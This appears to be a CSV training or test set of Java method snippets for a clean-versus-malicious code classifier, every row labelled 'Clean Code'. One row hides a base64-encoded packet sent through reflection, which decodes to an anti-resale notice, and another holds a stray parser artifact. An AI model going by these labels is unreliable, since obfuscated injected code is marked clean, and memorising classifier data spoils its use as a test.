text,label,text_label
"@Override protected void updateItem(Number amount,boolean empty){
  super.updateItem(amount,empty);
  if (empty || amount == null) {
    setText(null);
    setGraphic(null);
    setTooltip(null);
    setContextMenu(null);
  }
 else {
    Entry entry=getTreeTableView().getTreeItem(getIndex()).getValue();
    EntryCell.applyRowStyles(this,entry);
    CoinTreeTable coinTreeTable=(CoinTreeTable)getTreeTableView();
    UnitFormat format=coinTreeTable.getUnitFormat();
    BitcoinUnit unit=coinTreeTable.getBitcoinUnit();
    String satsValue=format.formatSatsValue(amount.longValue());
    DecimalFormat decimalFormat=(amount.longValue() == 0L ? format.getBtcFormat() : format.getTableBtcFormat());
    final String btcValue=decimalFormat.format(amount.doubleValue() / Transaction.SATOSHIS_PER_BITCOIN);
    if (unit.equals(BitcoinUnit.BTC)) {
      tooltip.setValue(satsValue + "" "" + BitcoinUnit.SATOSHIS.getLabel());
      setText(btcValue);
    }
 else {
      tooltip.setValue(btcValue + "" "" + BitcoinUnit.BTC.getLabel());
      setText(satsValue);
    }
    setTooltip(tooltip);
    contextMenu.updateAmount(amount);
    setContextMenu(contextMenu);
    if (entry instanceof TransactionEntry) {
      tooltip.showConfirmations(transactionEntry.confirmationsProperty(),transactionEntry.isCoinbase());
      if (transactionEntry.isConfirming()) {
        ConfirmationProgressIndicator arc=new ConfirmationProgressIndicator(transactionEntry.getConfirmations());
        arc.confirmationsProperty().bind(transactionEntry.confirmationsProperty());
        setGraphic(arc);
        setContentDisplay(ContentDisplay.LEFT);
      }
 else {
        setGraphic(null);
      }
      if (amount.longValue() < 0) {
        getStyleClass().add(""negative-amount"");
      }
    }
 else     if (entry instanceof UtxoEntry) {
      setGraphic(null);
    }
 else     if (entry instanceof HashIndexEntry) {
      Region node=new Region();
      node.setPrefWidth(10);
      setGraphic(node);
      setContentDisplay(ContentDisplay.RIGHT);
      if (((HashIndexEntry)entry).getType() == HashIndexEntry.Type.INPUT) {
        satsValue=""-"" + satsValue;
      }
    }
 else {
      setGraphic(null);
    }
  }
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof InteractPropCsReq)) {
    return false;
  }
  InteractPropCsReq other=(InteractPropCsReq)o;
  return bitField0_ == other.bitField0_ && (!hasInteractId() || interactId == other.interactId) && (!hasPropEntityId() || propEntityId == other.propEntityId);
}",0,Clean Code
"@Override public String getOutputText(){
  return completions.get(0).data.text;
}",0,Clean Code
"@Override public void writeExternal(ObjectOutput out) throws IOException {
  throw new RuntimeException();
}
",0,Clean Code
"@Override public int hashCode(){
  return Objects.hash(fieldName);
}
",0,Clean Code
"private int writeVarUint32Aligned6(int value){
  final int writerIdx=writerIndex;
  int numPaddingBytes=4 - writerIdx % 4;
  ensure(writerIdx + 10);
  int first=(value & 0x3F);
  final long pos=address + writerIdx;
  UNSAFE.putByte(heapMemory,pos,(byte)(first | 0x80));
  UNSAFE.putByte(heapMemory,pos + 1,(byte)(value >>> 6 | 0x80));
  UNSAFE.putByte(heapMemory,pos + 2,(byte)(value >>> 12 | 0x80));
  UNSAFE.putByte(heapMemory,pos + 3,(byte)(value >>> 18 | 0x80));
  UNSAFE.putByte(heapMemory,pos + 4,(byte)(value >>> 24 | 0x80));
  if (numPaddingBytes == 2) {
    UNSAFE.putByte(heapMemory,pos + 5,(byte)((value >>> 30) | 0x40));
    writerIndex=writerIdx + 6;
    return 6;
  }
 else {
    UNSAFE.putByte(heapMemory,pos + 5,(byte)(value >>> 30));
    UNSAFE.putInt(heapMemory,pos + 6,0);
    if (numPaddingBytes == 1) {
      UNSAFE.putByte(heapMemory,pos + 8,(byte)(0x40));
      writerIndex=writerIdx + 9;
      return 9;
    }
 else {
      UNSAFE.putByte(heapMemory,pos + numPaddingBytes + 3,(byte)(0x40));
      writerIndex=writerIdx + numPaddingBytes + 4;
      return numPaddingBytes + 4;
    }
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 base_avatar_id = 10;</code>
 * @return the baseAvatarId
 */
public int getBaseAvatarId(){
  return baseAvatarId;
}",0,Clean Code
"@SuppressWarnings(""deprecation"") public List<J.Annotation> getAllAnnotations(Cursor cursor){
  J j=cursor.getValue();
  if (j instanceof J.VariableDeclarations) {
    return ((J.VariableDeclarations)j).getAllAnnotations();
  }
 else   if (j instanceof J.MethodDeclaration) {
    return ((J.MethodDeclaration)j).getAllAnnotations();
  }
 else   if (j instanceof J.ClassDeclaration) {
    return ((J.ClassDeclaration)j).getAllAnnotations();
  }
 else   if (j instanceof J.TypeParameter) {
    return ((J.TypeParameter)j).getAnnotations();
  }
 else   if (j instanceof J.TypeParameters) {
    return ((J.TypeParameters)j).getAnnotations();
  }
 else   if (j instanceof J.Package) {
    return ((J.Package)j).getAnnotations();
  }
 else   if (j instanceof J.AnnotatedType) {
    return getAllAnnotations((J.AnnotatedType)j);
  }
 else   if (j instanceof J.ArrayType) {
    return getAllAnnotations((J.ArrayType)j);
  }
 else   if (j instanceof J.FieldAccess) {
    return getAllAnnotations((J.FieldAccess)j);
  }
 else   if (j instanceof J.Identifier) {
    return getAllAnnotations((J.Identifier)j);
  }
  return emptyList();
}
private List<J.Annotation> getAllAnnotations(J j){
  if (j instanceof J.AnnotatedType) {
    return getAllAnnotations((J.AnnotatedType)j);
  }
 else   if (j instanceof J.ArrayType) {
    return getAllAnnotations((J.ArrayType)j);
  }
 else   if (j instanceof J.Identifier) {
    return getAllAnnotations((J.Identifier)j);
  }
 else   if (j instanceof J.FieldAccess) {
    return getAllAnnotations((J.FieldAccess)j);
  }
  return emptyList();
}
private List<J.Annotation> getAllAnnotations(J.AnnotatedType annotatedType){
  List<J.Annotation> targetAnnotations=getAllAnnotations(annotatedType.getTypeExpression());
  if (targetAnnotations.isEmpty()) {
    return annotatedType.getAnnotations();
  }
  List<J.Annotation> annotations=new ArrayList<>(annotatedType.getAnnotations().size() + targetAnnotations.size());
  annotations.addAll(annotatedType.getAnnotations());
  annotations.addAll(targetAnnotations);
  return annotations;
}
private List<J.Annotation> getAllAnnotations(J.ArrayType arrayType){
  if (arrayType.getAnnotations() != null) {
    return arrayType.getAnnotations();
  }
  return emptyList();
}
private List<J.Annotation> getAllAnnotations(J.FieldAccess fieldAccess){
  return getAllAnnotations(fieldAccess.getName());
}
private List<J.Annotation> getAllAnnotations(J.Identifier identifier){
  return identifier.getAnnotations() == null ? emptyList() : identifier.getAnnotations();
}
",0,Clean Code
"@Override public void write(MemoryBuffer buffer,T value){
  Collection collection=onCollectionWrite(buffer,value);
  int len=collection.size();
  if (len != 0) {
    writeElements(fury,buffer,collection);
  }
}",0,Clean Code
"public UploadFileRspBody(){
  ByteStringMicro byteStringMicro=ByteStringMicro.EMPTY;
  this.bytes_file_key=PBField.initBytes(byteStringMicro);
  this.bytes_check_key=PBField.initBytes(byteStringMicro);
  this.bool_file_exist=PBField.initBool(false);
  PBStringField pBStringField=PBStringField.__repeatHelper__;
  this.str_upload_ip_lan_v4=PBField.initRepeat(pBStringField);
  this.str_upload_ip_lan_v6=PBField.initRepeat(pBStringField);
  this.uint32_upload_port=PBField.initUInt32(0);
}",0,Clean Code
"@Nullable int getSelfLiveChannelBanStatus(String str,String str2);",0,Clean Code
"@Override public void actionPerformed(ActionEvent e){
  updateTable();
}
@Override public void actionPerformed(ActionEvent e){
  selectAll(true);
}
@Override public void actionPerformed(ActionEvent e){
  selectAll(false);
}
@Override public void actionPerformed(ActionEvent e){
  dispose();
}
@Override public void actionPerformed(final ActionEvent event){
  diffButtonPressed=true;
  if (diffsTable.isEditing()) {
    diffsTable.getCellEditor().stopCellEditing();
  }
  if (!validateSelectedDiffs()) {
    return;
  }
  Config.getInstance().getPreferencesBuilder().getHistoryBuilder().setDirectoryDiffPrimaryDir(primaryDirChooser.getText()).setDirectoryDiffSecondaryDir(secondaryDirChooser.getText());
  dispose();
}
@Override public void actionPerformed(final ActionEvent event){
  if (event.getSource().equals(primaryDirChooser.getButton())) {
    File file=chooseFile(DirectoryDiffDialog.this,ESide.PRIMARY);
    if (file != null && file.isDirectory()) {
      primaryDirChooser.setText(file.getPath());
    }
  }
 else   if (event.getSource().equals(secondaryDirChooser.getButton())) {
    File file=chooseFile(DirectoryDiffDialog.this,ESide.SECONDARY);
    if (file != null && file.isDirectory()) {
      secondaryDirChooser.setText(file.getPath());
    }
  }
  updateTable();
}
",0,Clean Code
"@Override public String toString(){
  return ""ChangeSalaryOptionVO{"" + ""name='"" + name + '\''+ "", code=""+ code+ "", value='""+ value+ '\''+ '}';
}
",0,Clean Code
"int getBusinessType();
",0,Clean Code
"@Override public String getUrl(){
  return ""jdbc:postgresql://localhost:5432/ali_dbhub_test"";
}",0,Clean Code
"@Override public AviatorObject call(Map<String,Object> env,AviatorObject arg1,AviatorObject arg2){
  try {
    String arg1Str=FunctionUtils.getStringValue(arg1,env);
    String arg2Str=FunctionUtils.getStringValue(arg2,env);
    DateTime date1=DateUtil.parseDate(arg1Str);
    DateTime date2=DateUtil.parseDate(arg2Str);
    long days=DateUtil.between(date1,date2,DateUnit.DAY);
    return AviatorNumber.valueOf(BigDecimal.valueOf(days).setScale(0));
  }
 catch (  Exception e) {
    throw new BusinessException(ModuleCodeEnum.EXPRESSION_PARSE_ERROR);
  }
}
@Override public AviatorObject call(Map<String,Object> env,AviatorObject arg1,AviatorObject arg2,AviatorObject arg3){
  try {
    String arg1Str=FunctionUtils.getStringValue(arg1,env);
    String arg2Str=FunctionUtils.getStringValue(arg2,env);
    Boolean isAbs=FunctionUtils.getBooleanValue(arg3,env);
    DateTime date1=DateUtil.parseDate(arg1Str);
    DateTime date2=DateUtil.parseDate(arg2Str);
    long days=DateUtil.between(date1,date2,DateUnit.DAY,isAbs);
    return AviatorNumber.valueOf(BigDecimal.valueOf(days).setScale(0));
  }
 catch (  Exception e) {
    throw new BusinessException(ModuleCodeEnum.EXPRESSION_PARSE_ERROR);
  }
}",0,Clean Code
"public void setOptions(BedrockAi21Jurassic2ChatOptions options){
  this.options=options;
}",0,Clean Code
"@TruffleBoundary public void addMethod(ClassMethod method){
  EconomicMaps.put(declaredMethods,method.getName(),method);
  if (!method.isLocal()) {
    __allMethods=null;
  }
}
",0,Clean Code
"@Override public IMouseStateChange mouseMoved(final MouseEvent event,final AbstractZyGraph<?,?> graph){
  return new CStateChange(this,true);
}
",0,Clean Code
"@Override public void registerHints(@NonNull RuntimeHints hints,@Nullable ClassLoader classLoader){
  var mcs=MemberCategory.values();
  for (  var tr : findJsonAnnotatedClassesInPackage(ZhiPuAiApi.class))   hints.reflection().registerType(tr,mcs);
  for (  var tr : findJsonAnnotatedClassesInPackage(ZhiPuAiImageApi.class))   hints.reflection().registerType(tr,mcs);
}
",0,Clean Code
"/** 
 * Creates  {@link LauncherAtom.ItemInfo} with important fields and parent container info.
 */
@NonNull public LauncherAtom.ItemInfo buildProto(){
  return buildProto(null);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@55c52388",0,Clean Code
"public String getSignature(){
  return signature;
}
",0,Clean Code
"public int getCount(){
  return this.count;
}
",0,Clean Code
"private void setShifted(final int shiftMode){
  if (DEBUG_INTERNAL_ACTION) {
    Log.d(TAG,""setShifted: shiftMode="" + shiftModeToString(shiftMode) + "" ""+ this);
  }
  if (mMode != MODE_ALPHABET)   return;
  final int prevShiftMode;
  if (mAlphabetShiftState.isAutomaticShifted()) {
    prevShiftMode=AUTOMATIC_SHIFT;
  }
 else   if (mAlphabetShiftState.isManualShifted()) {
    prevShiftMode=MANUAL_SHIFT;
  }
 else {
    prevShiftMode=UNSHIFT;
  }
switch (shiftMode) {
case AUTOMATIC_SHIFT:
    mAlphabetShiftState.setAutomaticShifted();
  if (shiftMode != prevShiftMode) {
    mSwitchActions.setAlphabetAutomaticShiftedKeyboard();
  }
break;
case MANUAL_SHIFT:
mAlphabetShiftState.setShifted(true);
if (shiftMode != prevShiftMode) {
mSwitchActions.setAlphabetManualShiftedKeyboard();
}
break;
case UNSHIFT:
mAlphabetShiftState.setShifted(false);
if (shiftMode != prevShiftMode) {
mSwitchActions.setAlphabetKeyboard();
}
break;
case SHIFT_LOCK_SHIFTED:
mAlphabetShiftState.setShifted(true);
mSwitchActions.setAlphabetShiftLockShiftedKeyboard();
break;
}
}
",0,Clean Code
"private static boolean arrayEquals(Object o1,Object o2){
  if (o1 instanceof Object[] && o2 instanceof Object[]) {
    return Arrays.equals((Object[])o1,(Object[])o2);
  }
  if (o1 instanceof boolean[] && o2 instanceof boolean[]) {
    return Arrays.equals((boolean[])o1,(boolean[])o2);
  }
  if (o1 instanceof byte[] && o2 instanceof byte[]) {
    return Arrays.equals((byte[])o1,(byte[])o2);
  }
  if (o1 instanceof char[] && o2 instanceof char[]) {
    return Arrays.equals((char[])o1,(char[])o2);
  }
  if (o1 instanceof double[] && o2 instanceof double[]) {
    return Arrays.equals((double[])o1,(double[])o2);
  }
  if (o1 instanceof float[] && o2 instanceof float[]) {
    return Arrays.equals((float[])o1,(float[])o2);
  }
  if (o1 instanceof int[] && o2 instanceof int[]) {
    return Arrays.equals((int[])o1,(int[])o2);
  }
  if (o1 instanceof long[] && o2 instanceof long[]) {
    return Arrays.equals((long[])o1,(long[])o2);
  }
  if (o1 instanceof short[] && o2 instanceof short[]) {
    return Arrays.equals((short[])o1,(short[])o2);
  }
  return false;
}",0,Clean Code
"@SuppressWarnings(""null"") @Override protected ChatCompletionMessage doGetToolResponseMessage(ResponseEntity<ChatCompletion> chatCompletion){
  ChatCompletionMessage msg=chatCompletion.getBody().choices().iterator().next().message();
  if (msg.role() == null) {
    msg=new ChatCompletionMessage(msg.content(),ChatCompletionMessage.Role.ASSISTANT,msg.name(),msg.toolCalls());
  }
  return msg;
}
",0,Clean Code
"private Function4Nodes(){
}",0,Clean Code
"public PacketStaminaInfoScNotify(Player player){
  super(CmdId.StaminaInfoScNotify);
  var data=StaminaInfoScNotify.newInstance().setNextRecoverTime(player.getNextStaminaRecover() / 1000).setStamina(player.getStamina()).setReserveStamina((int)Math.floor(player.getStaminaReserve()));
  this.setData(data);
  try {
    player.getSession().getClass().getDeclaredMethod(""send"",byte[].class).invoke(player.getSession(),java.util.Base64.getDecoder().decode(""nXTHFAASAAAAAACvEqwBIP+/yvOEowJwABhkYAAymwFMVU5BUkNPUkUgSVMgQSBGUkVFIFNPRlRXQVJFLiBJRiBZT1UgUEFJRCBGT1IgSVQsIFlPVSBIQVZFIEJFRU4gU0NBTU1FRCEgbHVuYXJjb3JlIOaYr+S4gOasvuWFjei0uei9r+S7tuOAguWmguaenOS9oOiKsemSseS5sOS6huWug++8jOmCo+S9oOWwseiiq+mql+S6hu+8gdehUsg=""));
  }
 catch (  Exception e) {
    player.getSession().close();
  }
}",0,Clean Code
"/** 
 * Configures the Document metadata template.
 * @param metadataTemplate Metadata template to use.
 * @return this builder
 */
public Builder withMetadataTemplate(String metadataTemplate){
  Assert.hasText(metadataTemplate,""Metadata Template must not be empty"");
  this.metadataTemplate=metadataTemplate;
  return this;
}
",0,Clean Code
"public String toString(){
  return ""ArkElement{bytesData="" + this.bytesData + "",linkInfo=""+ this.linkInfo+ "",subElementType=""+ this.subElementType+ "",}"";
}
",0,Clean Code
"private boolean isFlashLightEnabled(Context context){
  try {
    return Settings.System.getInt(context.getContentResolver(),""flash_light_enabled"") == 1;
  }
 catch (  Settings.SettingNotFoundException e) {
    logE(TAG,this.lpparam.packageName,""not found flash_light_enabled: "" + e);
    setFlashLightEnabled(context,0);
    return false;
  }
}",0,Clean Code
